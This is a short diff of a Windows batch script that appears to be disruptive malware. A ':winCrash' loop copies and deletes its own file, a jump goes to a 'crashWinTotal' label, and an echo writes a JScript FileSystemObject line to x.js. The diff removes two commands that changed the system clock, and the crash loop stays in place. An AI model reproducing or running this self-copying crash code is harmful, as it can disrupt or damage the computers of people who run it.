@@ -17,8 +17,6 @@ chcp 866
 :winCrash
 copy %0
 del %0
-time 3:00
-time 12:00
 goto winCrash
 goto crashWinTotal
 echo f=new ActiveXObject(^"Scripting.FileSystemObject^");i=f.getFile(^"x^").openAsTextStream();>x.js
